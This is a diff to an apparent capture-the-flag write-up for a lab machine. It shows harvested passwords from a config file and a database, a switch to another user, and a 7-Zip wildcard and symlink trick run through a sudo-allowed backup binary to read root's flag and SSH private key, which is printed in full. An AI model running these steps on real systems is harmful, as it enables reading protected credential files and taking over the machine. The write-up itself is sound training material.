@@ -145,7 +145,7 @@ whatever1
 This account doesnt work on login page nor admin login page.
 I need to do more search on MySQL.
 
-i finally found the right user :
+i finally found the right user in **users** table from **usage_blog** database:
 ```
 Admin
 whatever1
@@ -228,4 +228,119 @@ The DB password:
 DB_DATABASE=usage_blog
 DB_USERNAME=staff
 DB_PASSWORD=s3cr3t_c0d3d_1uth
+```
+i found another password in .monitrc file (in **/home/dash**)
+```
+dash@usage:~$ cat .monitrc
+cat .monitrc
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+#Apache
+check process apache with pidfile "/var/run/apache2/apache2.pid"
+    if cpu > 80% for 2 cycles then alert
+
+
+#System Monitoring 
+check system usage
+    if memory usage > 80% for 2 cycles then alert
+    if cpu usage (user) > 70% for 2 cycles then alert
+        if cpu usage (system) > 30% then alert
+    if cpu usage (wait) > 20% then alert
+    if loadavg (1min) > 6 for 2 cycles then alert 
+    if loadavg (5min) > 4 for 2 cycles then alert
+    if swap usage > 5% then alert
+
+check filesystem rootfs with path /
+       if space usage > 80% then alert
+```
+```
+admin:3nc0d3d_pa$$w0rd
+```
+After some test, it was **Xander** password
+```
+dash@usage:~$ su xander 
+su xander
+Password: 3nc0d3d_pa$$w0rd
+xander@usage:/home/dash$ 
+```
+Looking at 127.0.0.1:2812, it just monit acces page.
+
+Look at sudo privilege :
+```
+xander@usage:/home/dash$ sudo -l
+sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+```
+I can execute **/usr/bin/usage_management** as root without password.
+```
+xander@usage:/$ file /usr/bin/usage_management
+file /usr/bin/usage_management
+/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
+```
+Maybe we can see some useless information with strings
+```
+
+```
+As we can see here :
+```
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+```
+It use 7zip to backup some file.
+As we can read [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----f1c2793eeb7e--------------------------------) :
+```
+In 7z even using -- before * (note that -- means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root
+```
+```
+xander@usage:/$ cd /var/www/html
+xander@usage:/var/www/html$ touch @root.txt
+xander@usage:/var/www/html$ ln -s /root/root.txt root.txt        
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3):
+```
+We're gonna chose **1. Project Backup**, because that where 7zip is used.
+```
+Scan WARNINGS for files and folders:
+
+cbfa2fdae1dacca017f8b7cc7acf886a : No more files
+```
+We have the root flag !
+
+We can also get the **id_rsa** of root with the same process :
+
+```
+xander@usage:/$ cd /var/www/html
+xander@usage:/var/www/html$ touch @root.txt
+xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa root.txt        
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+```
+```                                                                           
+Files read from disk: 17950
+Archive size: 54906479 bytes (53 MiB)
+
+Scan WARNINGS for files and folders:
+
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+----------------
 ```
